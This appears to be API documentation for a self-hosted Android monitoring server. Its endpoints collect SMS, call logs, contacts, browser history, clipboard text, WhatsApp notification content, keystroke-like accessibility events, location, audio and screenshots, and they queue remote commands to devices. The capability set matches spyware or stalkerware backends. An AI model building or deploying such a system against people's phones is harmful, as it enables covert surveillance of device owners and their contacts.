# API Documentation

## Authentication

Protected endpoints require the configured token either as:

```http
X-Token: <token>
```

or as query parameter:

```text
?token=<token>
```

The server uses timing-safe comparison. Do not expose the token in dashboards, logs, screenshots, or documentation.

## Base Runtime

- Default port: `3000`
- Default root: `NEXUS_ROOT=/opt/data/nexus-local`
- Data dir: `NEXUS_DATA_DIR` or `$NEXUS_ROOT/data`
- Dashboard dir: `NEXUS_DASHBOARD_DIR` or `$NEXUS_ROOT/dashboard`

## Endpoint Summary

| Method | Path | Purpose |
|---|---|---|
| `GET` | `/api/token` | Disabled; returns 404 |
| `POST` | `/api/ping` | Heartbeat, device registration/update, command delivery |
| `GET` | `/api/devices` | List devices and online state |
| `POST` | `/api/events` | Upload notification events |
| `GET` | `/api/events` | List events globally or for one device |
| `POST` | `/api/location` | Upload location point |
| `GET` | `/api/location/:deviceId` | List locations |
| `GET` | `/api/locations/:deviceId` | Alias for locations |
| `GET` | `/api/commands/:deviceId` | Read pending commands without consuming |
| `POST` | `/api/commands/:deviceId/:commandId/ack` | ACK and remove command |
| `POST` | `/api/commands/:deviceId` | Queue command |
| `POST` | `/api/media/:deviceId` | Upload media file |
| `GET` | `/api/media/:deviceId` | List media metadata |
| `GET` | `/api/media/:deviceId/:filename` | Download media file |
| `GET` | `/api/thumb/:deviceId/:filename` | Get/generate image thumbnail |
| `POST` | `/api/audio/:deviceId` | Upload audio file |
| `GET` | `/api/audio/:deviceId` | List audio metadata |
| `GET` | `/api/audio/:deviceId/:filename` | Download audio file |
| `POST` | `/api/screenshot/:deviceId` | Upload screenshot file |
| `GET` | `/api/screenshot/:deviceId` | List screenshots |
| `GET` | `/api/screenshot/:deviceId/:filename` | Download screenshot file |
| `POST` | `/api/sms/:deviceId` | Upload SMS batch |
| `GET` | `/api/sms/:deviceId` | List SMS records |
| `POST` | `/api/calllog/:deviceId` | Upload call log batch |
| `GET` | `/api/calllog/:deviceId` | List call records |
| `POST` | `/api/contacts/:deviceId` | Upload contacts |
| `GET` | `/api/contacts/:deviceId` | List contacts |
| `POST` | `/api/browser/:deviceId` | Upload browser history records |
| `GET` | `/api/browser/:deviceId` | List browser history records |
| `POST` | `/api/keylog/:deviceId` | Upload accessibility text events |
| `GET` | `/api/keylog/:deviceId` | List accessibility text events |
| `POST` | `/api/clipboard/:deviceId` | Upload clipboard record |
| `GET` | `/api/clipboard/:deviceId` | List clipboard records |
| `POST` | `/api/apps/:deviceId` | Upload installed app list |
| `GET` | `/api/apps/:deviceId` | List installed apps |
| `POST` | `/api/status/:deviceId` | Upload device status diagnostics |
| `GET` | `/api/status/:deviceId` | Read status diagnostics |
| `GET` | `/api/stats` | Totals per device and globally |
| `POST` | `/api/media/:deviceId/zip/prepare` | Start media ZIP job |
| `GET` | `/api/media/:deviceId/zip/status` | Check ZIP job status |
| `GET` | `/api/media/:deviceId/zip/download` | Download prepared ZIP |
| `POST` | `/api/ai/chat` | Ask AI over internal Nexus context |

## Heartbeat

### `POST /api/ping`

Request body fields:

```json
{
  "deviceId": "device-id",
  "deviceName": "device display name",
  "model": "manufacturer model",
  "androidVersion": "14",
  "battery": 80,
  "network": "WiFi",
  "ip": "optional",
  "reliabilityProtocol": 2,
  "status": {}
}
```

Response:

```json
{
  "ok": true,
  "commands": []
}
```

Protocol behavior:

- Protocol v2 clients keep commands on server until explicit ACK.
- Legacy protocol clients consume commands on delivery.

## Commands

### Create Command

```http
POST /api/commands/:deviceId
```

Allowed server-side command types:

- `sync_media`
- `get_location`
- `get_apps`
- `get_status`

Request:

```json
{
  "type": "get_status",
  "params": {}
}
```

Response:

```json
{
  "ok": true,
  "command": {
    "id": "uuid",
    "type": "get_status",
    "params": {},
    "ts": 1234567890
  }
}
```

### Inspect Pending Commands

```http
GET /api/commands/:deviceId
```

Read-only; does not consume commands.

### Acknowledge Command

```http
POST /api/commands/:deviceId/:commandId/ack
```

Request:

```json
{
  "success": true,
  "detail": "accepted"
}
```

ACK removes the command from pending queue and appends an ACK record under `command-acks`.

## Media

### Upload

```http
POST /api/media/:deviceId
Content-Type: multipart/form-data
```

Field: `file`

Server behavior:

- Stores file under `media/<deviceId>/`.
- Sanitizes filename.
- Limits file size to 200 MB.
- Adds metadata to `media/<deviceId>/meta.json`.
- Dedups by `name + size` and returns `{ ok: true, dedup: true }` when duplicate.

### List

```http
GET /api/media/:deviceId?type=photo&page=1&limit=9999
```

Response:

```json
{
  "total": 10,
  "items": []
}
```

`type` can be `photo` or `video`.

### Thumbnail

```http
GET /api/thumb/:deviceId/:filename
```

- Generates cached 300x300 JPEG thumbnails for images.
- Returns `415` for video thumbnail requests.

## Events

### Upload

```http
POST /api/events
```

Request:

```json
{
  "deviceId": "device-id",
  "events": [
    {
      "app": "WhatsApp",
      "pkg": "com.whatsapp",
      "title": "Conversation",
      "conversation": "Conversation",
      "sender": "Sender",
      "body": "Message text",
      "ts": 1234567890,
      "source": "messaging_style",
      "complete": true,
      "eventId": "dedup-id"
    }
  ]
}
```

Server sanitizes control characters and deduplicates by `eventId`.

### List

```http
GET /api/events?deviceId=<id>&app=<optional>&limit=200
```

Without `deviceId`, events across all devices are merged and sorted.

## SMS / Calls / Contacts

### SMS Upload

```http
POST /api/sms/:deviceId
```

Body:

```json
{ "messages": [] }
```

Server returns `{ "ok": true, "added": <count> }`.

### Call Log Upload

```http
POST /api/calllog/:deviceId
```

Body:

```json
{ "calls": [] }
```

Server dedup key: `number_date`.

### Contacts Upload

```http
POST /api/contacts/:deviceId
```

Body:

```json
{ "contacts": [] }
```

Server stores the full contact array.

## WebSocket

Connect to the server WebSocket with:

```text
ws://host:3000/?token=<token>
```

Device registration message:

```json
{
  "type": "register",
  "deviceId": "device-id"
}
```

Broadcast message shape:

```json
{
  "event": "device_ping",
  "data": {},
  "ts": 1234567890
}
```

Broadcast event names observed in code:

- `device_ping`
- `event`
- `location`
- `command_sent`
- `media_new`
- `audio_new`
- `screenshot_new`
- `sms_new`
- `calllog_new`
- `clipboard_new`
- `device_status`
